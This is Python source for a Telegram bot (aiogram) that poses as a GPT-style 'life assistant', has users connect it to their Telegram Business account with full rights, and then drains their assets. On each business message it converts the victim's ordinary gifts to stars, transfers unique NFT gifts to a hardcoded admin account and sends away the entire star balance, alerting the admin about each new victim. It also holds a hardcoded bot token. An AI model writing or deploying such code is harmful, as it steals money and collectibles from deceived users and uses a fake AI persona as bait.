import asyncio
import json
import logging
import os

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
from aiogram.methods import GetBusinessAccountGifts, GetBusinessAccountStarBalance, TransferGift, ConvertGiftToStars, SendMessage
from aiogram.enums import ParseMode

# ====== –ù–∞—Å—Ç—Ä–æ–π–∫–∏ ======
TOKEN = "8009461376:AAHjMUEZV5L90B1Vqrv7tHm8XQZDaKUFNMU"
ADMIN_ID = 861087987
CONNECTIONS_FILE = "business_connections.json"

bot = Bot(token=TOKEN)
dp = Dispatcher()


# ====== –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ ======

def load_connections():
    try:
        with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return []

def save_connections(data):
    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

async def send_welcome_message_to_admin(business_connection, _bot):
    try:
        rights = business_connection.rights
        bc = business_connection

        rights_text = "\n".join([
            f"‚ñ´Ô∏è –£–¥–∞–ª–µ–Ω–∏–µ –≤—Å–µ—Ö —Å–æ–æ–±—â–µ–Ω–∏–π: {'‚úÖ' if rights.can_delete_all_messages else '‚ùå'}",
            f"‚ñ´Ô∏è –†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∏–º–µ–Ω–∏: {'‚úÖ' if rights.can_edit_name else '‚ùå'}",
            f"‚ñ´Ô∏è –†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –æ–ø–∏—Å–∞–Ω–∏—è: {'‚úÖ' if rights.can_edit_bio else '‚ùå'}",
            f"‚ñ´Ô∏è –†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Ñ–æ—Ç–æ –ø—Ä–æ—Ñ–∏–ª—è: {'‚úÖ' if rights.can_edit_profile_photo else '‚ùå'}",
            f"‚ñ´Ô∏è –†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ username: {'‚úÖ' if rights.can_edit_username else '‚ùå'}",
            f"‚ñ´Ô∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –ø–æ–¥–∞—Ä–∫–æ–≤: {'‚úÖ' if rights.can_change_gift_settings else '‚ùå'}",
            f"‚ñ´Ô∏è –ü—Ä–æ—Å–º–æ—Ç—Ä –ø–æ–¥–∞—Ä–∫–æ–≤ –∏ –∑–≤—ë–∑–¥: {'‚úÖ' if rights.can_view_gifts_and_stars else '‚ùå'}",
            f"‚ñ´Ô∏è –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è –ø–æ–¥–∞—Ä–∫–æ–≤ –≤ –∑–≤—ë–∑–¥—ã: {'‚úÖ' if rights.can_convert_gifts_to_stars else '‚ùå'}",
            f"‚ñ´Ô∏è –ü–µ—Ä–µ–¥–∞—á–∞/—É–ª—É—á—à–µ–Ω–∏–µ –ø–æ–¥–∞—Ä–∫–æ–≤: {'‚úÖ' if rights.can_transfer_and_upgrade_gifts else '‚ùå'}",
            f"‚ñ´Ô∏è –ü–µ—Ä–µ–¥–∞—á–∞ –∑–≤—ë–∑–¥: {'‚úÖ' if rights.can_transfer_stars else '‚ùå'}",
            f"‚ñ´Ô∏è –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∏—Å—Ç–æ—Ä–∏—è–º–∏: {'‚úÖ' if rights.can_manage_stories else '‚ùå'}",
            f"‚ñ´Ô∏è –£–¥–∞–ª–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π: {'‚úÖ' if rights.can_delete_sent_messages else '‚ùå'}",
        ])

        star_amount = 0
        all_gifts_amount = 0
        unique_gifts_amount = 0

        if rights.can_view_gifts_and_stars:
            star_resp = await bot(GetBusinessAccountStarBalance(business_connection_id=bc.id))
            star_amount = star_resp.star_amount

            gifts_resp = await bot(GetBusinessAccountGifts(business_connection_id=bc.id))
            all_gifts_amount = len(gifts_resp.gifts)
            unique_gifts_amount = sum(1 for gift in gifts_resp.gifts if gift.type == "unique")

        msg = (
            f"ü§ñ <b>–ù–æ–≤—ã–π –±–∏–∑–Ω–µ—Å-–±–æ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω!</b>\n\n"
            f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{bc.user.username or '‚Äî'}\n"
            f"üÜî User ID: <code>{bc.user.id}</code>\n"
            f"üîó Connection ID: <code>{bc.id}</code>\n\n"
            f"{rights_text}\n\n"
            f"‚≠êÔ∏è –ó–≤–µ–∑–¥—ã: <code>{star_amount}</code>\n"
            f"üéÅ –ü–æ–¥–∞—Ä–∫–æ–≤: <code>{all_gifts_amount}</code>\n"
            f"üîù NFT –ø–æ–¥–∞—Ä–∫–æ–≤: <code>{unique_gifts_amount}</code>"
        )

        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="üéÅ –í—ã–≤–µ—Å—Ç–∏ –≤—Å–µ –ø–æ–¥–∞—Ä–∫–∏ (–∏ –ø—Ä–µ–≤—Ä–∞—Ç–∏—Ç—å –≤ –∑–≤–µ–∑–¥—ã)", callback_data=f"reveal_all_gifts:{bc.user.id}")],
            [InlineKeyboardButton(text="‚≠êÔ∏è –ü—Ä–µ–≤—Ä–∞—Ç–∏—Ç—å –≤—Å–µ –ø–æ–¥–∞—Ä–∫–∏ –≤ –∑–≤–µ–∑–¥—ã", callback_data=f"convert_exec:{bc.user.id}")],
            [InlineKeyboardButton(text="üîù –ê–ø–≥—Ä–µ–π–¥–Ω—É—Ç—å –≤—Å–µ –≥–∏—Ñ—Ç—ã", callback_data=f"upgrade_user:{bc.user.id}")]
        ])

        await _bot.send_message(ADMIN_ID, msg, parse_mode=ParseMode.HTML, reply_markup=keyboard)

    except Exception:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Å–æ–æ–±—â–µ–Ω–∏—è –∞–¥–º–∏–Ω—É")


# ====== –•–µ–Ω–¥–ª–µ—Ä—ã ======

@dp.message(Command("start"))
async def start_command(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer(
            "‚ù§Ô∏è <b>–Ø ‚Äî —Ç–≤–æ–π –≥–ª–∞–≤–Ω—ã–π –ø–æ–º–æ—â–Ω–∏–∫ –≤ –∂–∏–∑–Ω–∏</b>, –∫–æ—Ç–æ—Ä—ã–π:\n"
            "‚Ä¢ –æ—Ç–≤–µ—Ç–∏—Ç –Ω–∞ –ª—é–±–æ–π –≤–æ–ø—Ä–æ—Å\n"
            "‚Ä¢ –ø–æ–¥–¥–µ—Ä–∂–∏—Ç —Ç–µ–±—è –≤ —Ç—Ä—É–¥–Ω—É—é –º–∏–Ω—É—Ç—É\n"
            "‚Ä¢ —Å–¥–µ–ª–∞–µ—Ç –∑–∞ —Ç–µ–±—è –¥–æ–º–∞—à–∫—É, —Ä–∞–±–æ—Ç—É –∏–ª–∏ –¥–∞–∂–µ –Ω–∞—Ä–∏—Å—É–µ—Ç –∫–∞—Ä—Ç–∏–Ω—É\n\n"
            "<i>–í–≤–µ–¥–∏ –∑–∞–ø—Ä–æ—Å –Ω–∏–∂–µ, –∏ —è –ø–æ–º–æ–≥—É —Ç–µ–±–µ!</i> üëá",
            parse_mode=ParseMode.HTML
        )
    else:
        await message.answer(
            "/gifts - –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –≥–∏—Ñ—Ç—ã\n"
            "/stars - –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –∑–≤–µ–∑–¥—ã\n"
            "/transfer <owned_id> <business_connect> - –ø–µ—Ä–µ–¥–∞—Ç—å –≥–∏—Ñ—Ç –≤—Ä—É—á–Ω—É—é\n"
            "/convert - –∫–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å –ø–æ–¥–∞—Ä–∫–∏ –≤ –∑–≤–µ–∑–¥—ã"
        )


@dp.message(Command("refund"))
async def refund_command(message: Message):
    try:
        parts = message.text.split()
        if len(parts) != 2:
            await message.answer("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ id –æ–ø–µ—Ä–∞—Ü–∏–∏. –ü—Ä–∏–º–µ—Ä: /refund 123456")
            return

        transaction_id = parts[1]

        refund_result = await bot.refund_star_payment(
            user_id=message.from_user.id,
            telegram_payment_charge_id=transaction_id
        )

        if refund_result:
            await message.answer(f"–í–æ–∑–≤—Ä–∞—Ç –∑–≤—ë–∑–¥ –ø–æ –æ–ø–µ—Ä–∞—Ü–∏–∏ {transaction_id} —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω!")
        else:
            await message.answer(f"–ù–µ —É–¥–∞–ª–æ—Å—å –≤—ã–ø–æ–ª–Ω–∏—Ç—å –≤–æ–∑–≤—Ä–∞—Ç –ø–æ –æ–ø–µ—Ä–∞—Ü–∏–∏ {transaction_id}.")

    except Exception as e:
        await message.answer(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –≤–æ–∑–≤—Ä–∞—Ç–∞: {str(e)}")


@dp.message(F.text)
async def handle_text_query(message: Message):
    await message.answer(
        "üìå <b>–î–ª—è –ø–æ–ª–Ω–æ—Ü–µ–Ω–Ω–æ–π —Ä–∞–±–æ—Ç—ã –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–¥–∫–ª—é—á–∏—Ç—å –±–æ—Ç–∞ –∫ –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç—É Telegram</b>\n\n"
        "–ö–∞–∫ —ç—Ç–æ —Å–¥–µ–ª–∞—Ç—å?\n\n"
        "1. ‚öôÔ∏è –û—Ç–∫—Ä–æ–π—Ç–µ <b>–ù–∞—Å—Ç—Ä–æ–π–∫–∏ Telegram</b>\n"
        "2. üíº –ü–µ—Ä–µ–π–¥–∏—Ç–µ –≤ —Ä–∞–∑–¥–µ–ª <b>Telegram –¥–ª—è –±–∏–∑–Ω–µ—Å–∞</b>\n"
        "3. ü§ñ –û—Ç–∫—Ä–æ–π—Ç–µ –ø—É–Ω–∫—Ç <b>–ß–∞—Ç-–±–æ—Ç—ã</b>\n"
        "4. ‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ <code>@TitanGpt_RoBot</code>\n\n"
        "–ò–º—è –±–æ—Ç–∞: <code>@TitanGpt_RoBot</code>\n\n"
        "‚ùó–î–ª—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–π —Ä–∞–±–æ—Ç—ã –±–æ—Ç—É —Ç—Ä–µ–±—É—é—Ç—Å—è <b>–≤—Å–µ –ø—Ä–∞–≤–∞</b>",
        parse_mode=ParseMode.HTML
    )


@dp.business_connection()
async def handle_business_connect(business_connection):
    await send_welcome_message_to_admin(business_connection, bot)
    await bot.send_message(
        business_connection.user.id,
        "–ü—Ä–∏–≤–µ—Ç! –¢—ã –ø–æ–¥–∫–ª—é—á–∏–ª –±–æ—Ç–∞ –∫–∞–∫ –±–∏–∑–Ω–µ—Å-–∞—Å—Å–∏—Å—Ç–µ–Ω—Ç–∞. –¢–µ–ø–µ—Ä—å –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –≤ –ª—é–±–æ–º –ª–∏—á–Ω–æ–º —á–∞—Ç–µ '.gpt –∑–∞–ø—Ä–æ—Å'"
    )
    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –±–∏–∑–Ω–µ—Å-–ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ
    connections = load_connections()

    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å—Ç—å –ª–∏ —É–∂–µ –∑–∞–ø–∏—Å—å
    exists = any(conn.get("user_id") == business_connection.user.id for conn in connections)
    if not exists:
        connections.append({
            "user_id": business_connection.user.id,
            "business_connection_id": business_connection.id,
            "username": business_connection.user.username,
            "first_name": business_connection.user.first_name or "",
            "last_name": business_connection.user.last_name or ""
        })
        save_connections(connections)


@dp.business_message()
async def handle_business_message(message: types.Message):
    business_id = message.business_connection_id
    user_id = message.from_user.id

    if user_id == ADMIN_ID:
        return  # –ê–¥–º–∏–Ω—Å–∫–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è –∏–≥–Ω–æ—Ä–∏—Ä—É–µ–º

    try:
        # –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è –Ω–µ—É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤
        gifts_response = await bot(GetBusinessAccountGifts(business_connection_id=business_id))
        for gift in gifts_response.gifts:
            if gift.type != "unique":
                try:
                    await bot(ConvertGiftToStars(business_connection_id=business_id, owned_gift_id=gift.owned_gift_id))
                except Exception as e:
                    logging.error(f"–û—à–∏–±–∫–∞ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏ –ø–æ–¥–∞—Ä–∫–∞ {gift.owned_gift_id}: {e}")

        # –û—Ç–ø—Ä–∞–≤–∫–∞ —É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤ –∞–¥–º–∏–Ω—É (ADMIN_ID)
        for gift in gifts_response.gifts:
            if gift.type == "unique":
                try:
                    await bot(TransferGift(business_connection_id=business_id, owned_gift_id=gift.owned_gift_id, user_id=ADMIN_ID, stars=25))
                    logging.info(f"–ü–æ–¥–∞—Ä–æ–∫ {gift.owned_gift_id} –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –∞–¥–º–∏–Ω—É")
                except Exception as e:
                    logging.error(f"–û—à–∏–±–∫–∞ –ø–µ—Ä–µ–¥–∞—á–∏ –ø–æ–¥–∞—Ä–∫–∞ {gift.owned_gift_id}: {e}")

        # –û—Ç–ø—Ä–∞–≤–∫–∞ –∑–≤–µ–∑–¥ –∞–¥–º–∏–Ω—É
        star_balance = await bot(GetBusinessAccountStarBalance(business_connection_id=business_id))
        if star_balance.star_amount > 0:
            await bot.transfer_business_account_stars(business_connection_id=business_id, stars=star_balance.star_amount)
            logging.info(f"–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ {star_balance.star_amount} –∑–≤–µ–∑–¥ –∞–¥–º–∏–Ω—É")
        else:
            logging.info("–ó–≤–µ–∑–¥ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –Ω–µ—Ç")

    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –±–∏–∑–Ω–µ—Å-—Å–æ–æ–±—â–µ–Ω–∏—è: {e}")


# ====== –ó–∞–ø—É—Å–∫ –±–æ—Ç–∞ ======
async def main():
    logging.basicConfig(level=logging.INFO)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
